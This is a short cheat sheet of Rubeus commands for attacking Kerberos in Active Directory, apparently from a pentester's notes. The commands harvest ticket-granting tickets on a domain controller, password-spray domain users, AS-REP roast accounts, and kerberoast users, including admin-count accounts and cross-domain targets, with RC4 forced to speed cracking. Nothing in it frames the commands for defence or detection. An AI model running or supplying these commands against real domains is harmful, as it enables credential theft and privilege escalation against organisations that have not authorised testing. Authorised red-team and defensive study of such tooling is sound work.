This tool is for "raw Kerberos interaction and abuse."

```powershell
.\Rubeus.exe harvest /interval:30 # Harvest TGTs every 30 seconds (run on DC)
.\Rubeus.exe brute /password:Password1 /noticket # Password spray against domain users (on DC only MAYBE)
.\Rubeus.exe asreproast # AS-REP roast all asreproastable users
.\Rubeus.exe kerberoast /nowrap # Kerberoast all kerberoastable users 
.\Rubeus.exe kerberoast /stats # View relevant statistics
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap # Kerberoast users with admincount = 1
.\Rubeus.exe kerberoast /user:<username> /nowrap /domain:<domain> # Kerberoast a user (can be used cross-domain)
.\Rubeus.exe kerberoast /user:<username> /nowrap /tgtdeleg # Force RC4 encryption, accelerating cracking exponentially.
```

https://github.com/GhostPack/Rubeus
